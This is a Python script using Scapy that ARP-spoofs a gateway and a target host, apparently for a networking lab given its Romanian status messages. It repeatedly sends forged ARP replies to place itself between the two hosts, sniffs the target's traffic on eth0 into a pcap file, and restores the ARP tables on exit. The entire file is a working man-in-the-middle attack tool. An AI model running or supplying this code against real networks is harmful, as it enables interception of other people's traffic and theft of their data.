from scapy.all import ARP, Ether, srp, send, sniff, wrpcap
import threading
import signal
import time
import os

running = True
packet_count = 0


def get_mac_addr(ip_addr):
    arp = ARP(op = 1, pdst = ip_addr)
    broadcast = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    request = broadcast/arp 
    result = srp(request, timeout = 3, verbose = False)[0]
    if result:
        return result[0][1].src
    return None 

def arp_poisoning(target_ip, fake_ip):
    global packet_count
    target_mac = get_mac_addr(target_ip)
    poisoned_packet = ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = fake_ip)
    send(poisoned_packet, verbose = False)
    packet_count += 1
    print(f'\rPachete trimise -> {packet_count}', end = '', flush = True)

def arp_spoofing(default_gateway, target):
    global running
    while running:
        arp_poisoning(default_gateway, target)
        arp_poisoning(target, default_gateway)
        time.sleep(2)
    print('Spooferul s-a oprit...')


def packets_sniffing(default_gateway, target):
    global running 
    while running:
        sniff_filter = f'ip host {target}'
        packets = sniff(filter = sniff_filter, iface = 'eth0', timeout = 1)
        if packets:
            wrpcap('captured_packets.pcap', packets)
    print('Snifferul s-a oprit...')

def restore(dest_ip, src_ip):
    dest_mac = get_mac_addr(dest_ip)
    src_mac = get_mac_addr(src_ip)
    packet = ARP(op = 2, pdst = dest_ip, hwdst = dest_mac, psrc = src_ip, hwsrc = src_mac)
    send(packet, count = 5, verbose = False)
    print('Reteaua a revenit la normal.')

def stop_threads(signum, frame):
    global running
    running = False

def main():
    default_gateway = '198.7.0.1'
    target = '198.7.0.2'

    signal.signal(signal.SIGINT, stop_threads)
    signal.signal(signal.SIGTERM, stop_threads)

    spoofer = threading.Thread(target=arp_spoofing, args=(default_gateway, target))
    spoofer.start()

    packets_sniffing(default_gateway, target)

    restore(default_gateway, target)
    restore(target, default_gateway)
    print('Terminat')

if __name__ == "__main__":
    main()